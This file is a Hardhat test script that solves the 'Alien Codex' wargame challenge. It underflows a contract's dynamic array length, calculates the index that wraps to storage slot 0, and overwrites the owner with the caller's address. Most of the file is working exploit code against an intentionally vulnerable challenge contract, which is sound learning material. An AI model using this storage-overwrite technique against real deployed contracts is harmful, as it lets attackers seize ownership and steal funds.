import { ethers } from "hardhat";
import { expect } from "chai";


describe("aliencodex", function() {
    it("should solve alien codex challenge", async function() {
        this.timeout(0);

        // setup & check wallet account 
        const accounts = await ethers.getSigners();
        const eoa = accounts[0];
        let balance = await eoa.getBalance();

        console.log(ethers.utils.formatEther(balance));
        expect(balance).to.gt(0);

        let targetABI = [
            "function isOwner() public view returns (bool)",
            "function make_contact() public",
            "function retract() public",
            "function revise(uint i, bytes32 _content) public",
        ];

        const targetAddr = "0x167a9b0De090fEC0Fd8E189073e16366d29adE4a";
        let targetCont = new ethers.Contract(targetAddr, targetABI, ethers.getDefaultProvider());
        targetCont = targetCont.connect(eoa);


        // a contract modifier checks this
        let tx = await targetCont.make_contact();
        await tx.wait();
        console.log(tx);

        // underflow dynamic array length
        tx = await targetCont.retract();
        await tx.wait();
        console.log(tx);

        /* 
         * 0: 0x000000000000000000000001da5b3fb76c78b6edee6be8f11a1c31ecfb02b272
         * 1: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
         * 2: 0x0000000000000000000000000000000000000000000000000000000000000000
         * 3: 0x0000000000000000000000000000000000000000000000000000000000000000
         * 4: 0x0000000000000000000000000000000000000000000000000000000000000000
         * 
         * first 12 byte of slot 0 is contact variable. 20 byte is the owner address
         * owner is defined before since it comes from inheritance but these two are
         * stored in that way due to packing
         * 
         * slot 1 is array length.
         * 
         * ref for exploiting this type of vulnerabilities:
         * https://github.com/Arachnid/uscc/tree/master/submissions-2017/doughoyte#solidity-storage-layout
        */

        // print first x storage slot
        for (let i = 0; i < 5; i++) {
            let slot = await eoa.provider!.getStorageAt(targetCont.address, i);
            console.log(`${i}: ${slot}`);
        }

        let storageSpace = ethers.BigNumber.from(2).pow(256);
        // codex is at storage index 1 so keccak256(1)
        let codexBeginning = ethers.BigNumber.from(
            ethers.utils.keccak256("0x0000000000000000000000000000000000000000000000000000000000000001")
            );
        let diffToStorage0 = storageSpace.sub(codexBeginning);
        
        // pad addres with 0s to fill bytes32 typed param
        let addr = ethers.utils.zeroPad(eoa.address, 32);
        
        tx = await targetCont.revise(diffToStorage0, addr);
        await tx.wait();
        console.log(tx);
        
        const isOwner = await targetCont.isOwner();
        expect(isOwner).to.be.true;
    });
});